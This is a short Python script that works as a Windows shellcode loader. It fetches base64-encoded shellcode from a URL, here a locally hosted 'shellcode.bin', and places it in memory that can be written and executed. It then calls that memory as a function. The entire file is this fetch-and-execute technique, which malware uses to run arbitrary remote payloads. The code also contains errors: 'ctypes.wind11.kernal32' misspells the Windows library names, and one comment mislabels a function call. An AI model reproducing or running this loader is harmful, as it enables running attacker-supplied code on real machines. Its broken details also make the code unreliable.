from urllib import request

import base64
import ctypes

kernal32 = ctypes.wind11.kernal32

def get_code(url):  #Preserving data by encoding and decoding in base64
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read()) #Decoding as bytes and reading as shellcode


    return shellcode


def write_memory(buf):
    length = len(buf)

    kernal32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernal32.VirtualAlloc(None, length, 0x3000, 0x40) #0x40 corresponds to privilages needed to write into memory (write and execute shellcode)

    kernal32.RtlMoveMemory.argtypes = (
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_size_t)
    kernal32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):                         #
    buf = ctypes.create_string_buffer(shellcode)    #Creates buffer
    ptr = write_memory(buf)                         #Writes buffer to memory
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = "http://127.0.0.1/shellcode.bin"  #Local hosted shellcode
    shellcode = get_code(url)               #Calls run function above
    run(shellcode)
